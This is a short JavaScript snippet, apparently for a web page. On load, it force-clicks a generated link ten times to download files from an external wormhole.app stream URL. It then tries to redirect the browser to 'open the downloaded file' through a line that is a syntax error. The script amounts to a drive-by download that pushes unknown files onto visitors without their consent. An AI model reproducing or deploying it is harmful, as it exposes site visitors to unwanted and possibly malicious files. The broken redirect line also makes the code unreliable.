window.onload = function() {
    // Loop 10 times
    for (var i = 0; i < 10; i++) {
        // Create an anchor element
        var downloadLink = document.createElement('a');
        downloadLink.href = 'https://wormhole.app/download-stream/dHm9FH66Y5m82tZu4XMWqg'; // Replace with your link
        downloadLink.download = 'filename_' + i + '.ext'; // Specify the filename and extension
        document.body.appendChild(downloadLink);
        downloadLink.click(); // Simulate a click on the link to trigger the download
        document.body.removeChild(downloadLink); // Clean up the element from the DOM
    }
    // After downloading, open the downloaded file
    setTimeout(function(){
        window.location.href = 'JohnAustin' + *; // Replace with your link
    }, 2000); // Adjust the timeout value as needed
};
